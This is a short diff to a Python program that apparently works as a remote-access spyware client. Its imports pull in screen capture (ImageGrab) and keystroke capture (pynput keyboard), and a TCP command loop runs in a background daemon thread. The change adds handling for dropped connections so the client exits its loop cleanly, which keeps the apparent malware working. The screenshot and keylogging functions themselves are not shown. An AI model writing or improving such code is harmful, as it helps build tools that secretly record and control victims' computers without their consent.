@@ -10,6 +10,7 @@ from time import sleep
 from PIL import ImageGrab
 from os.path import exists
 from os import remove
+from sys import exit
 from pynput import keyboard
 
 
@@ -301,8 +302,13 @@ def tcp_connection()->None:
                else:
                    s.send("Invalid command !".encode())
             except IndexError:
-                s.send("Invalid arguement format, see documentation.".encode())         
-                pass
+                try:
+                   s.send("Invalid arguement format, see documentation.".encode())         
+                except ConnectionAbortedError:
+                     break
+
+            except ConnectionAbortedError:
+                   break
 
 if __name__ == "__main__":
     tcp_thread = Thread(target=tcp_connection,daemon=True)
